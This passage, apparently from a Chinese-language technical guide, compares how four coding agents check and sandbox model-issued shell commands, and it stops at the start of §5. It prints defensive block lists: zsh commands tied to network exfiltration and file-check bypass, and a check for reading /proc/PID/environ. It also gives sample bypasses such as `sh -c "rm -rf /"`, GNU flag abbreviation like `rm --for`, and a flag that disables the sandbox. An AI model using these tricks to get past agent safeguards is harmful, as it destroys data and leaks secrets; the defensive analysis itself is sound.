@@ -1,0 +1,873 @@
+---
+title: 07 · Shell 执行
+sidebar:
+  order: 7
+description: execpolicy Starlark DSL、Bash 23 项安全检查、allowlist 加 safe-bin profile、多后端 terminal：四家怎么让模型跑 shell
+---
+
+import Verdict from '@components/Verdict.astro';
+import CompareTable from '@components/CompareTable.astro';
+import Diagram from '@components/Diagram.astro';
+import TradeOff from '@components/TradeOff.astro';
+import ScoreCard from '@components/ScoreCard.astro';
+import BuildRecipe from '@components/BuildRecipe.astro';
+import SourceTrail from '@components/SourceTrail.astro';
+import SourceBlock from '@components/SourceBlock.astro';
+
+## §1 · TL;DR
+
+<Verdict tldr="Shell 是 agent 跟外部世界耦合最深的一根管子，也是 agent 工程里事故频率最高的地方。模型如果能跑任意 shell 命令理论上就能做任何事（删文件、改系统、发邮件、上传敏感数据），所以 agent 工程里所有关于安全的努力最终都汇集到一个问题：怎么让模型在 shell 这一层不出事？要回答四个问题：怎么判断命令安不安全（关键词匹配、正则、AST 解析）、不安全时怎么处理（拒绝、审批、隔离）、怎么防 obfuscation（base64 编码、`$()` 子 shell、`sh -c` wrapper 等花样绕过过滤）、跑这个动作能不能沙箱化（看进程对文件系统、网络、内核的访问能力）。四家做出了完全不同的取舍。Codex 走「执行策略做成 DSL」路线：把所有规则用 Starlark 脚本语言（Google 在 Bazel 里用的那种）写在一份独立 .codexpolicy 文件里，每条规则带 match、not_match 字段作为自带单测（启动时全跑一遍，错的规则启动就失败），返回三档 Decision（Allow、Prompt、Forbidden），多条规则命中时最严的赢。这一层只决定该不该跑，跑起来还有第二层独立 sandbox（Linux Landlock 加 seccomp、macOS seatbelt）卡系统调用。Claude Code 走「BashTool 内部塞 23 项 bash 解析级安全检查」路线：用 tree-sitter 把 bash 命令解析成 AST，然后用 23 类编号检查器（INCOMPLETE_COMMANDS、OBFUSCATED_FLAGS、SHELL_METACHARACTERS、IFS_INJECTION、PROC_ENVIRON_ACCESS、UNICODE_WHITESPACE 直到 QUOTED_NEWLINE 第 23 项）一条条检查每个 AST 节点，每个对应一类真实出现过的 shell 注入 trick。命令通过 23 项检查后默认还要进 sandbox（macOS sandbox-exec、Linux bubblewrap）。OpenClaw 走「二维矩阵加 per-binary safe-bin profile」路线：execSecurity 三档（deny、allowlist、full）、execAsk 三档（off、on-miss、always）、execHost 三档（sandbox、gateway、node），27 种组合给运维细粒度调参。allowlist 模式下每个被允许的 binary 还有自己的 safe-bin profile 登记可用 flag、位置参数边界，连 GNU long flag 缩写（--for 缩写到 --force）都会被还原检测。Hermes 走「不挡 shell，挡执行环境」反向路线：通过 TERMINAL_ENV 环境变量把整个 terminal 丢进 7 种后端之一（local、docker、modal、ssh、singularity、daytona、managed-modal），命令层只挡 workdir（字符 allowlist 防 shell metacharacter）加委托 tirith 子进程做危险命令探测。逻辑是「容器里炸了不影响 host」。四种思路成本曲线完全不同：Codex 维护成本高但规则可 git 化可 review，Claude Code 默认安全度最高但解析开销大，OpenClaw 配置面最丰富但用户要理解 27 种组合，Hermes 命令层挡截最弱但靠容器兜底最稳。" />
+
+## §2 · Shell 拦截 4 关卡对照
+
+<Diagram
+  src="/diagrams/07-shell-execution-base.svg"
+  alt="四系统的 shell 执行栈：从模型 tool_call 到磁盘副作用之间的拦截层"
+  caption="同一句 `git push --force`，进了四个不同的 shell pipeline，最终到达内核的概率从左到右递减。"
+/>
+
+四家在 4 个关键节点（语法解析、策略判定、审批入口、执行隔离）上的落地：
+
+<CompareTable
+  rows={[
+    { label: '语法、参数解析', values: ['执行前 shlex 分词加 Starlark 规则匹配', 'tree-sitter 加 shell-quote 双解析加 23 项 ID 化安全检查', '`splitCommand` 加 `exec-obfuscation-detect` 加 safe-bin 参数白名单、黑名单', 'workdir 字符级 allowlist 加 dangerous command guard'] },
+    { label: '策略 DSL', values: ['Starlark `prefix_rule(pattern, decision, match, not_match)`', '`bashPermissionRule()` (prefix、exact、wildcard) 加 GrowthBook 远程下发', '`security: deny、allowlist、full` 乘以 `ask: off、on-miss、always` 二维矩阵', '配置走 `~/.hermes/config.json` 加后端 env 变量'] },
+    { label: '决策类型', values: ['`Allow`、`Prompt`、`Forbidden`（strictest match wins）', 'allow、deny 加进沙箱、不进沙箱', '`{allowed: true}` 或 `{allowed: false, eventReason}`', '`once`、`session`、`always`、`deny`（user callback 决定）'] },
+    { label: '执行后端', values: ['sandbox_mode: read-only、workspace-write、danger-full-access。Linux Landlock 加 macOS seatbelt', 'SandboxManager（macOS sandbox-exec、Linux bubblewrap）加 `dangerouslyDisableSandbox` 退路', '`ExecHost: sandbox、gateway、node` 三档。Node 是 fallback', '`TERMINAL_ENV: local、docker、modal、ssh、singularity、daytona、managed-modal` 7 种'] },
+    { label: '审批往返', values: ['`approval_policy: untrusted、on-failure、on-request、never`，CLI tui 接 prompt', 'permission mode（plan、acceptEdits、bypassPermissions、default）加 canUseTool hook', 'JSONL socket 推 `exec-approval-manager` 走 UI、Discord 投票', '`_approval_callback` 注入：CLI 直接 prompt，gateway 走 IM 平台'] },
+  ]}
+  caption="一条命令从 tool_call 到 PID 之间能被拦下的关卡"
+  dimensionLabel="维度"
+/>
+
+## §3 · 四家怎么实现 shell 执行
+
+### Codex · 执行策略做成 Starlark DSL 独立文件
+
+Codex 在 shell 执行这件事上的核心判断是：哪些命令能跑这件事本质上是一组业务规则。什么命令该禁、什么命令该问、什么命令该放行，会随时间不断演进（新发现一个绕过 trick 就要加规则、新工具上线就要加新规则、企业政策变化就要调整规则），如果把这些规则硬编码在 Rust 代码里，每次改规则就要重新发版，运维和安全团队就完全没法独立迭代。所以 Codex 选择把这一层提取成独立的 DSL（领域专用语言），用一种叫 Starlark 的脚本语言（Google 在 Bazel 构建系统里用的那个 Python 子集，特点是确定性求值、没有副作用、易于沙箱化）写在一份独立的 .codexpolicy 文件里，agent 启动时加载这份文件，每次工具调用前用规则匹配命令、命中后返回三档 Decision：
+
+<SourceBlock path="REF/codex/codex-rs/execpolicy/src/decision.rs" lines="1-28" system="codex" summary="execpolicy 的三档决策枚举">
+
+```rust
+pub enum Decision {
+    /// Command may run without further approval.
+    Allow,
+    /// Request explicit user approval; rejected outright
+    /// when running with `approval_policy="never"`.
+    Prompt,
+    /// Command is blocked without further consideration.
+    Forbidden,
+}
+```
+
+</SourceBlock>
+
+策略本身长这样（取自 examples）：
+
+<SourceBlock path="REF/codex/codex-rs/execpolicy/examples/example.codexpolicy" lines="1-46" system="codex" summary="Starlark 写的 prefix 规则 + match/not_match 自带单测">
+
+```python
+prefix_rule(
+    pattern = ["git", "reset", "--hard"],
+    decision = "forbidden",
+    justification = "destructive operation",
+    match = [
+        ["git", "reset", "--hard"],
+    ],
+    not_match = [
+        ["git", "reset", "--keep"],
+        "git reset --merge",
+    ],
+)
+
+prefix_rule(
+    pattern = ["cp"],
+    decision = "prompt",
+    match = [
+        ["cp", "foo", "bar"],
+        "cp -r src dest",
+    ],
+)
+```
+
+</SourceBlock>
+
+这个例子里有三个工程细节值得反复看。第一个是 match 跟 not_match 字段把每条规则的「期望行为」就地写成单元测试。每条 prefix_rule 既声明了模式，也声明了「这些命令应该命中」和「这些命令不应该命中」。agent 启动加载 .codexpolicy 时会把每条规则的 match 和 not_match 全部跑一遍验证，写错的规则启动就直接 panic，不会等到运行时碰到才崩。例子里 `git reset --hard` 的规则就明确说「命中 `git reset --hard` 但不命中 `git reset --keep` 跟 `git reset --merge`」，未来如果加新规则导致 `git reset --keep` 也被误拦，启动就 fail，运维立刻发现。第二个是 justification 字段：拦截一条命令时这段文字会显示在 approval prompt 里，告诉用户「这条命令为什么被拦了」（例子里写的是 destructive operation），用户不用去翻代码也能立刻明白原因。好的 justification 还可以提示替代命令（比如 `git reset --hard` 被拦了，justification 可以告诉用户「试试 `git stash` 加 `git checkout` 组合」）。第三个是「最严决策赢」原则：一条命令可能命中多条规则（比如 `git reset --hard origin/main` 既命中 `git` 规则又命中 `git reset --hard` 规则），不需要规则之间互斥，Codex 内部会按照 Forbidden 大于 Prompt 大于 Allow 的优先级取最严的那个，规则作者写规则时不需要考虑「我跟其他规则会不会冲突」，大大降低了维护复杂度。
+
+execpolicy 这一层只决定「该不该跑」。决定通过后真要跑起来还要再过第二层独立的 sandbox 隔离：sandbox_mode 提供三档（read-only 只读不写、workspace-write 只能写工作目录、danger-full-access 全开），Linux 上用 Landlock 加 seccomp 组合（Landlock 限制文件系统访问、seccomp 拦截系统调用），macOS 上用 seatbelt（sandbox-exec 配 .sb 策略文件）。两层之间的关系是：execpolicy 卡命令字面（看 argv 长什么样），sandbox 卡系统调用（看进程实际想干什么），即使 execpolicy 漏放了一条危险命令，sandbox 也能挡住命令尝试做的危险操作。这种双层 defense in depth 是 Codex 的核心安全设计：任何单层有漏洞另一层兜底。
+
+### Claude Code · BashTool 内部 23 项 ID 化安全检查加 tree-sitter 双解析
+
+Claude Code 在 shell 执行上做出了跟 Codex 完全相反的判断：它不做独立的 DSL，而是把全部拦截逻辑塞进 BashTool 这一个工具的内部。理由是：bash 是一种语义复杂的语言（有 here-doc、command substitution、process substitution、various redirection、brace expansion、parameter expansion 等等），简单的 prefix 匹配根本没法准确判断「这条 bash 命令到底要做什么」。要真正弄懂 bash 命令的语义只能走 AST 解析，而 AST 解析的复杂度跟规则匹配语言已经不在一个量级，所以索性把 AST 解析跟所有具体的检查器都集成到 BashTool 内部，给每个检查器编上数字 ID（这样日志只记 ID 不记原始命令，避免 PII 泄漏）。打开 bashSecurity.ts 第一段就是 23 类风险的编号清单：
+
+<SourceBlock path="REF/claude-code-2.1.88-expanded/src/tools/BashTool/bashSecurity.ts" lines="76-101" system="claude" summary="23 类 bash 安全检查 ID（用数字而不是字符串记日志，避免 PII 泄漏）">
+
+```ts
+const BASH_SECURITY_CHECK_IDS = {
+  INCOMPLETE_COMMANDS: 1,
+  JQ_SYSTEM_FUNCTION: 2,
+  JQ_FILE_ARGUMENTS: 3,
+  OBFUSCATED_FLAGS: 4,
+  SHELL_METACHARACTERS: 5,
+  DANGEROUS_VARIABLES: 6,
+  NEWLINES: 7,
+  DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,
+  DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,
+  DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10,
+  IFS_INJECTION: 11,
+  GIT_COMMIT_SUBSTITUTION: 12,
+  PROC_ENVIRON_ACCESS: 13,
+  MALFORMED_TOKEN_INJECTION: 14,
+  BACKSLASH_ESCAPED_WHITESPACE: 15,
+  BRACE_EXPANSION: 16,
+  CONTROL_CHARACTERS: 17,
+  UNICODE_WHITESPACE: 18,
+  MID_WORD_HASH: 19,
+  ZSH_DANGEROUS_COMMANDS: 20,
+  BACKSLASH_ESCAPED_OPERATORS: 21,
+  COMMENT_QUOTE_DESYNC: 22,
+  QUOTED_NEWLINE: 23,
+} as const
+```
+
+</SourceBlock>
+
+读这 23 个 ID 就能感受到这层防护干的活有多细。ID 1 INCOMPLETE_COMMANDS 是「命令以 `\` 或 `|` 结尾导致行未结束」（攻击者可能用这种构造让 bash 在 here-doc 里继续接收命令）。ID 4 OBFUSCATED_FLAGS 是「flag 被 base64、hex、unicode 编码后混在 argv 里」。ID 5 SHELL_METACHARACTERS 是检测「`&` `|` `;` `&&` `||` `<` `>` `<<` `<<<` `()` `{}` `[]` `$` `\`` 这些会改变命令语义的字符」。ID 11 IFS_INJECTION 是「内置变量 IFS 被改写导致 bash 用其他字符作分隔符」（一个经典的注入手法）。ID 13 PROC_ENVIRON_ACCESS 是「访问 /proc/PID/environ 文件偷其他进程的环境变量」。ID 18 UNICODE_WHITESPACE 是「使用 Unicode 空白字符（U+00A0 不间断空格、U+2028 行分隔符等）让 bash parser 看到的命令跟肉眼看到的不一样」。ID 19 MID_WORD_HASH 是「一个 word 中间夹 `#` 字符」（在某些 bash 配置下可能被当注释开始）。ID 22 COMMENT_QUOTE_DESYNC 是「注释里的引号让后续 bash 解析陷入引号未关闭状态」。ID 23 QUOTED_NEWLINE 是「引号里的换行符让单行命令实际跨多行执行」。每一个 ID 都对应一类真实出现过的 shell 注入 trick，Claude Code 团队在 GitHub Security Advisories 或 CVE 数据库找到对应的攻击模式后，每个 trick 加一个独立检查器，规模化的 defense-in-depth 思路。
+
+第二层防护是 zsh 特有的危险命令拒绝清单。bash 跟 zsh 在 shell 语法上很相似但 zsh 有几个额外的危险特性：zmodload 可以动态加载 zsh 模块（比如 zsh/system 模块加载后就有 sysopen、syswrite、sysseek 这种绕过文件 binary 检查的 builtin。zsh/zpty 模块加载后就有 zpty 这种 pseudo-terminal 执行能力。zsh/net/tcp 模块加载后就有 ztcp 直接走 TCP 网络的能力。zsh/files 模块加载后就有 zf_rm、zf_mv、zf_chmod 这些绕过 PATH binary 解析的 builtin）：
+
+<SourceBlock path="REF/claude-code-2.1.88-expanded/src/tools/BashTool/bashSecurity.ts" lines="45-74" system="claude" summary="zsh 模块加载相关的 dangerous command 集合">
+
+```ts
+const ZSH_DANGEROUS_COMMANDS = new Set([
+  // zmodload is the gateway to many dangerous module-based attacks:
+  // zsh/mapfile (invisible file I/O via array assignment),
+  // zsh/system (sysopen/syswrite two-step file access),
+  // zsh/zpty (pseudo-terminal command execution),
+  // zsh/net/tcp (network exfiltration via ztcp),
+  // zsh/files (builtin rm/mv/ln/chmod that bypass binary checks)
+  'zmodload',
+  'emulate',     // eval-equivalent
+  'sysopen', 'sysread', 'syswrite', 'sysseek',  // zsh/system
+  'zpty',        // pseudo-terminal exec
+  'ztcp', 'zsocket',
+  'mapfile',
+  'zf_rm', 'zf_mv', 'zf_ln', 'zf_chmod',  // builtins that bypass binary checks
+  // ...
+])
+```
+
+</SourceBlock>
+
+这一类「zsh 模块加载」防护几乎只有写过实战 zsh 漏洞利用的人才会想到。大多数 bash 安全方案完全忽略 zsh 的独特攻击面，但 Claude Code 因为面向所有平台的开发者，必须考虑 zsh 用户的命令到底是怎么执行的。`emulate` 是 zsh 的 eval 等价物（执行 string 作为命令）也被拒绝。
+
+第三层防护是 sandbox。命令通过了上面 23 项检查加 zsh dangerous commands 后，shouldUseSandbox() 默认返回 true，把命令丢进 sandbox 跑（macOS 用 sandbox-exec、Linux 用 bubblewrap），只有用户显式在 settings 里把命令加进 `sandbox.excludedCommands`、或者命令调用时显式传 `dangerouslyDisableSandbox: true` 才不进沙箱：
+
+<SourceBlock path="REF/claude-code-2.1.88-expanded/src/tools/BashTool/shouldUseSandbox.ts" lines="130-153" system="claude" summary="sandbox-by-default：默认进沙箱，用户白名单才放行">
+
+```ts
+export function shouldUseSandbox(input: Partial<SandboxInput>): boolean {
+  if (!SandboxManager.isSandboxingEnabled()) return false
+
+  // Don't sandbox if explicitly overridden AND unsandboxed commands are allowed
+  if (
+    input.dangerouslyDisableSandbox &&
+    SandboxManager.areUnsandboxedCommandsAllowed()
+  ) return false
+
+  if (!input.command) return false
+
+  if (containsExcludedCommand(input.command)) return false
+
+  return true
+}
+```
+
+</SourceBlock>
+
+这段代码里有一个工程上很重要的注释（在源码 shouldUseSandbox.ts 文件靠前的位置）写道：「excludedCommands is a user convenience feature, not a security boundary」。明确告诉所有 reviewer 跟未来开发者「这个 excludedCommands 不是给攻击者用来绕过沙箱的，而是给用户在『我知道这条命令安全可以不进沙箱』的场景做便利的。真正的安全边界是 sandbox 加 permission prompt 两层，sandbox 永远默认开启除非用户主动添加白名单，permission prompt 永远会问除非用户主动批准 always」。这种「明确区分 convenience feature 跟 security boundary」的工程纪律在四家里只有 Claude Code 写得最清楚。这一行注释让任何想「把 excludedCommands 当作绕开安全检查的快捷方式」的尝试都立刻被识别为误用。
+
+### OpenClaw · 二维矩阵加 per-binary safe-bin profile 加 GNU long-flag 缩写还原
+
+OpenClaw 在 shell 执行上做的判断又跟前两家不同：它认为不同的部署形态（个人开发机、企业 CI、生产服务）对 shell 执行的安全偏好差异巨大，平台不应该硬编码任何一种策略，而应该给运维提供细粒度的旋钮，让他们按自己的部署场景调整。所以 OpenClaw 把 shell 执行抽成一套独立的 exec-approvals 子系统，定义了三个独立维度供运维组合：
+
+<SourceBlock path="REF/openclaw/src/infra/exec-approvals.ts" lines="10-36" system="openclaw" summary="security × ask 二维：3 × 3 = 9 种组合">
+
+```ts
+export type ExecHost = "sandbox" | "gateway" | "node";
+export type ExecSecurity = "deny" | "allowlist" | "full";
+export type ExecAsk = "off" | "on-miss" | "always";
+
+export function normalizeExecHost(value?: string | null): ExecHost | null {
+  const normalized = value?.trim().toLowerCase();
+  if (normalized === "sandbox" || normalized === "gateway" || normalized === "node") {
+    return normalized;
+  }
+  return null;
+}
+```
+
+</SourceBlock>
+
+三个维度的含义是这样的。ExecHost 是「在哪个宿主里跑」：sandbox 是 OpenClaw 内置的隔离沙箱（具体怎么实现由部署方决定，可以接 Docker、Firecracker、Lambda）。gateway 是把执行委托给一个常驻的 gateway daemon（多个 agent 共享一个隔离边界）。node 是直接在当前 Node.js 进程里跑（fallback 模式，没有隔离）。ExecSecurity 是「安全级别」：deny 直接禁所有 shell 执行（适合「这个 agent 完全不该跑 shell」的场景）。allowlist 只允许白名单内的命令。full 全开（适合个人开发机充分信任 agent 的场景）。ExecAsk 是「问不问用户」：off 永远不问。on-miss 只在 allowlist 未命中时问（让用户决定要不要临时放行）。always 每条命令都问（最保守的场景）。三个维度的乘积理论上有 3 乘 3 乘 3 等于 27 种组合，实际有意义的大约 12 种，运维可以根据自己的场景挑组合（例如 sandbox 加 allowlist 加 on-miss 适合企业 CI，gateway 加 full 加 off 适合受信任的内部部署）。
+
+allowlist 模式下有一个特别细致的处理：shell wrapper（`sh -c`、`bash -c`、Windows `cmd.exe /c`）会被单独 block。理由是这种 wrapper 是把 allowlist 绕过的最常见 trick：
+
+<SourceBlock path="REF/openclaw/src/node-host/exec-policy.ts" lines="52-90" system="openclaw" summary="evaluateSystemRunPolicy：allowlist 模式下 shell wrapper 直接 deny">
+
+```ts
+export function evaluateSystemRunPolicy(params: {
+  security: ExecSecurity;
+  ask: ExecAsk;
+  analysisOk: boolean;
+  allowlistSatisfied: boolean;
+  approvalDecision: ExecApprovalDecision;
+  approved?: boolean;
+  isWindows: boolean;
+  cmdInvocation: boolean;
+  shellWrapperInvocation: boolean;
+}): SystemRunPolicyDecision {
+  const shellWrapperBlocked =
+    params.security === "allowlist" && params.shellWrapperInvocation;
+  const windowsShellWrapperBlocked =
+    shellWrapperBlocked && params.isWindows && params.cmdInvocation;
+  const analysisOk = shellWrapperBlocked ? false : params.analysisOk;
+  const allowlistSatisfied = shellWrapperBlocked ? false : params.allowlistSatisfied;
+  // ...
+  if (params.security === "deny") {
+    return {
+      allowed: false,
+      eventReason: "security=deny",
+      errorMessage: "SYSTEM_RUN_DISABLED: security=deny",
+      // ...
+    };
+  }
+  // ...
+}
+```
+
+</SourceBlock>
+
+具体的绕过场景是：假设 allowlist 包含 git、npm、ls 这三个 binary，攻击者可能让模型生成 `sh -c "rm -rf /"`。argv 第一个 token 是 sh（不在 allowlist 但是常见 shell），如果 OpenClaw 只检查 argv[0] 就放行，那 `-c` 后面的 `rm -rf /` 就会被 sh 执行。为了堵这个洞，OpenClaw 在 allowlist 模式下把 sh、bash、zsh、cmd.exe、powershell 这些 shell wrapper 单独 deny，连带 Windows 上的 cmd /c 也专门处理（因为 cmd 的语法跟 sh 不一样，需要单独识别）。结合代码看 `shellWrapperBlocked = security === "allowlist" && shellWrapperInvocation`，只有在 allowlist 模式才 block（full 模式不 block 因为既然全放行就不在乎 wrapper、deny 模式根本进不来）。如果命令被识别为 shell wrapper，整个命令的 analysisOk 跟 allowlistSatisfied 都被强制设为 false，命令必定被拒绝。
+
+allowlist 命中后，OpenClaw 还有第二层精细控制：每个被允许的 binary 都有自己的 safe-bin profile，登记可用的 flag、最少、最多位置参数等：
+
+<SourceBlock path="REF/openclaw/src/infra/exec-safe-bin-policy-profiles.ts" lines="1-30" system="openclaw" summary="每个允许的二进制带 flag 白名单 / 黑名单 / 位置参数边界">
+
+```ts
+export type SafeBinProfile = {
+  minPositional?: number;
+  maxPositional?: number;
+  allowedValueFlags?: ReadonlySet<string>;
+  deniedFlags?: ReadonlySet<string>;
+  // Precomputed long-option metadata for GNU abbreviation resolution.
+  knownLongFlags?: readonly string[];
+  knownLongFlagsSet?: ReadonlySet<string>;
+  longFlagPrefixMap?: ReadonlyMap<string, string | null>;
+};
+```
+
+</SourceBlock>
+
+具体的字段含义是这样的。allowedValueFlags 是「这个 binary 允许使用的 flag」（例如 git 的 profile 可能 allow `--branch`、`--no-pager` 但不 allow `--git-dir`，避免攻击者改 git internals）。deniedFlags 是「这个 binary 明确禁止的 flag」（例如 rm 的 profile 必须 deny `--force` 跟 `--recursive`）。minPositional 跟 maxPositional 是位置参数的边界（例如 ls 的 profile 可能要求 minPositional=0 maxPositional=10，防止有人传一百个位置参数让进程爆栈）。knownLongFlagsSet 跟 longFlagPrefixMap 是 GNU long flag 的元信息，专门用来处理 GNU 风格的 long flag 缩写。
+
+GNU long flag 缩写还原是 OpenClaw 在 4 个开源 agent 里独有的功能。GNU 工具支持 long flag 缩写：只要缩写能唯一匹配到一个完整 flag，缩写就生效。例如 `git --version` 等价于 `git --vers` 等价于 `git --ver`（只要 `--ve` 开头的 long flag 只有 `--version` 一个）。`rm --force` 也可以缩写成 `rm --for` 甚至 `rm --fo`（只要 `--f` 开头的 long flag 只有 `--force` 一个）。如果攻击者知道 deniedFlags 包含 `--force`，可以让模型生成 `rm --for` 试图绕过。OpenClaw 利用 longFlagPrefixMap 把任何 long flag 缩写还原成完整 flag 后再匹配 allowedValueFlags、deniedFlags，所以 `--for` 跟 `--force` 算同一个东西，攻击者没法用缩写绕过。这种细节级别的反 obfuscation 在 4 个开源 agent 里独此一家：其他三家都没专门处理 GNU long flag 缩写。
+
+审批环节走异步通信。当一条命令需要 ask（命中 on-miss 或 always 策略），exec-approval-manager 不在原地阻塞，而是通过 JSONL socket 把审批请求推给 UI、Discord、CLI、gateway 任一个 channel（具体走哪个 channel 由用户当前在哪个入口活跃决定），用户在自己习惯的入口确认或拒绝。这种「审批入口跟 agent 主循环解耦」的设计让 OpenClaw 可以同时接多个入口（详见第 14 章多通道入口），用户在 Telegram 上跟 agent 聊到一半也可以批准 IDE 里 agent 想跑的 git 命令。
+
+### Hermes · 不挡 shell，挡执行环境：命令丢进 7 种后端之一隔离
+
+Hermes 在 shell 执行上选择了一条跟前三家完全相反的路。它的判断是：在命令层面做复杂的 AST 解析加 23 项检查加 safe-bin profile 这类细致工作维护成本极高（每发现一个新 trick 就要加规则、规则之间还可能互相冲突）、误报误漏永远没法降到 0，而且本质上是在跟攻击者做永无止境的 cat-and-mouse 游戏。不如换个思路：直接接受「命令层挡不住所有攻击」的现实，把所有命令都丢进一个强隔离环境里跑，让容器、沙箱在系统调用层兜底，这样即使命令层被绕过，也炸不到 host。具体实现上 Hermes 提供 7 种后端选项，用户通过 TERMINAL_ENV 环境变量选择：
+
+<SourceBlock path="REF/hermes-agent/tools/terminal_tool.py" lines="1-32" system="hermes" summary="terminal 工具支持 7 种执行后端，从 local 到 cloud sandbox">
+
+```python
+"""
+Terminal Tool Module
+
+A terminal tool that executes commands in local, Docker, Modal, SSH,
+Singularity, and Daytona environments. Supports local execution,
+containerized backends, and Modal cloud sandboxes, including managed
+gateway mode.
+
+Environment Selection (via TERMINAL_ENV environment variable):
+- "local": Execute directly on the host machine (default, fastest)
+- "docker": Execute in Docker containers (isolated, requires Docker)
+- "modal": Execute in Modal cloud sandboxes (direct Modal or managed gateway)
+
+Features:
+- Multiple execution backends (local, docker, modal)
+- Background task support
+- VM/container lifecycle management
+- Automatic cleanup after inactivity
+"""
+```
+
+</SourceBlock>
+
+7 种后端的差异展开：local 是「直接在 host 上跑」零隔离最快，适合个人开发机充分信任 agent 的场景。docker 是「本地 Docker 容器」隔离中等延迟低，适合大部分场景。modal 是「Modal 云端 sandbox」隔离强但要走网络，适合 SaaS agent。singularity 是「HPC 容器」专为高性能计算环境设计。daytona 是「dev-as-a-service 容器」适合 dev environment 即用即弃的场景。ssh 是「远程机器」适合在专用机器上跑命令。managed-modal 是 Modal 的托管模式（直接对接 Modal 的 gateway，不需要用户自己管 Modal API key）。每种后端还有自己的 image、CPU、memory、disk、persistence 等独立配置维度（参见第 13 章 sandbox），用户可以按场景精细调整。
+
+虽然主要隔离靠环境，Hermes 还是在命令层做了两件最少必要的事：`workdir` 字符 allowlist 加 `_check_all_guards`：
+
+<SourceBlock path="REF/hermes-agent/tools/terminal_tool.py" lines="150-177" system="hermes" summary="workdir 安全字符正则 + allowlist 校验">
+
+```python
+# Allowlist: characters that can legitimately appear in directory paths.
+_WORKDIR_SAFE_RE = re.compile(r'^[A-Za-z0-9/\\:_\-.~ +@=,]+$')
+
+
+def _validate_workdir(workdir: str) -> str | None:
+    """Reject workdir values that don't look like a filesystem path.
+
+    Uses an allowlist of safe characters rather than a deny-list, so novel
+    shell metacharacters can't slip through.
+    """
+    if not workdir:
+        return None
+    if not _WORKDIR_SAFE_RE.match(workdir):
+        for ch in workdir:
+            if not _WORKDIR_SAFE_RE.match(ch):
+                return (
+                    f"Blocked: workdir contains disallowed character {repr(ch)}. "
+                    "Use a simple filesystem path without shell metacharacters."
+                )
+        return "Blocked: workdir contains disallowed characters."
+    return None
+```
+
+</SourceBlock>
+
+注意这一段代码里几个细节。`_WORKDIR_SAFE_RE` 用的是 allowlist（明确列出允许的字符）而不是 deny-list（明确列出禁止的字符），作者在 docstring 里直白写：「Uses an allowlist of safe characters rather than a deny-list, so novel shell metacharacters can't slip through」。deny-list 是「黑名单」思路（列出已知坏字符），新冒出来的 metacharacter 永远绕过。allowlist 是「白名单」思路（只允许已知安全字符），加新字符比较慢但漏的概率接近 0。这种「写明为什么用 allowlist 不用 deny-list」的文档习惯让后人维护时不会误改成 deny-list。允许的字符集合 `A-Za-z0-9/\\:_\-.~ +@=,` 包含了文件系统路径需要的所有合法字符（字母数字、路径分隔符、冒号、下划线、连字符、点、波浪号、空格、加号、@ 号、等号、逗号），完全够覆盖现实路径，但排除了所有 shell metacharacter（`$ ` `` ` `` `|` `&` `;` `(` `)` `{` `}` `<` `>` `'` `"` `\` 等）。如果 workdir 字符串里出现任何不在 allowlist 的字符，函数会逐字符再扫一遍找出具体哪个字符违规，给用户一条精准的错误消息（不是「workdir invalid」这种模糊的，而是「Blocked: workdir contains disallowed character '$'」这种具体的）。
+
+`_check_all_guards` 是命令层的第二道护栏，它委托给 tirith（Hermes 自家的危险命令探测子进程）做实际判定加 approval_callback（用户提供的审批回调）。tirith 是个独立进程，跑在 agent 的子进程里，加载几百个危险命令模式（参见第 20 章安全）做匹配，返回 exit code（0 允许、1 阻止、2 警告）。agent 拿到结果后调用 approval_callback 让用户决定 once、session、always、deny，CLI 模式下直接在终端 prompt，gateway 模式下走 Telegram、Slack、Discord 等 IM 平台（参见第 14 章多通道入口）。
+
+为什么 Hermes 在命令层只做这么少？因为它的核心理念是「真正的隔离不在命令层，在执行环境层」。如果你担心一条命令的安全性，把 TERMINAL_ENV 换成 docker、modal、managed-modal，命令就跑在容器里炸了不影响 host。命令层做太多 AST 解析跟规则匹配性价比不高。这把「防护重心」从 shell 命令层挪到了执行环境层，是 Hermes 跟前三家最大的范式差异。
+
+## §4 · 四家共有的 4 条 Shell 执行工程底线
+
+虽然四家在 shell 执行的工程深度上差距巨大（Codex 独立 DSL 对比 Hermes 几乎不挡），但只要做 shell，四件事是共识。
+
+**第一件是 bash、zsh 没法只靠正则挡**。这是被大量实战教训打出来的共识：bash、zsh 的语法有 here-doc（`<<EOF ... EOF`）、command substitution（`$(...)` 跟 `` `...` ``）、process substitution（`<(...)`）、各种 redirection、brace expansion（`{a,b,c}`）、parameter expansion（`${var:-default}`）等等复杂特性，简单的正则匹配 `rm` 不能识别 `(rm)` 或者 `r"m"` 或者 `\rm` 这种变形，简单的正则禁 `&&` 不能识别 here-doc 里的换行加第二条命令。所以 Codex 用 shlex 分词加 Starlark 规则、Claude Code 上 tree-sitter（真正的 bash AST 解析器）、OpenClaw 做专门的 obfuscation-detect、Hermes 干脆把 workdir 限定到字符 allowlist。没有一家试图用一行正则解决问题，都至少有 lexer 级的解析。
+
+**第二件是命令归命令、环境归环境**。四家都把「该不该跑这条命令」和「在哪跑、能访问什么」分成两层独立的关卡。Codex 是 execpolicy 加 sandbox_mode 双层（命令字面对比系统调用）、Claude Code 是 23 项检查加 SandboxManager 双层（AST 内容对比进程隔离）、OpenClaw 是 ExecSecurity 加 ExecHost 双层（命令策略对比执行宿主）、Hermes 是 workdir、tirith 加 TERMINAL_ENV 双层（命令字面对比后端隔离）。这种「双层独立判断」的设计是基础工程理性：任何单层有漏洞另一层兜底，混在一起的设计在源码里看不到。
+
+**第三件是审批是异步通道，不阻塞 agent 主循环**。当一条命令需要 ask user 时，四家都用某种异步机制把审批请求推出去然后继续等回调，而不是阻塞当前线程死等用户输入。Codex 走 TUI（CLI 终端里出一个交互框）、Claude Code 走 permission mode（IDE 弹窗）、OpenClaw 走 JSONL socket（推到任何活跃 channel）、Hermes 走 approval_callback（callback 内部决定走哪个 IM 平台）。这种异步设计让 agent 在等审批期间可以继续做其他事（比如读文件、查文档），用户体感不会卡。
+
+**第四件是 shell wrapper（sh -c、bash -c、cmd /c）是高危**。这种 wrapper 把真实的命令藏在 `-c` 后面的字符串里，让 argv 层面的检查（只看 argv[0]）无效。四家都对这种 wrapper 做特殊处理：OpenClaw 直接在 allowlist 模式下 deny 整个 wrapper、其他三家在解析层把 wrapper 后面的字符串当作新命令再走一次完整解析。
+
+## §5 · 关键分歧 · 按场景选型
+
+<Diagram
+  src="/diagrams/07-tradeoff.svg"
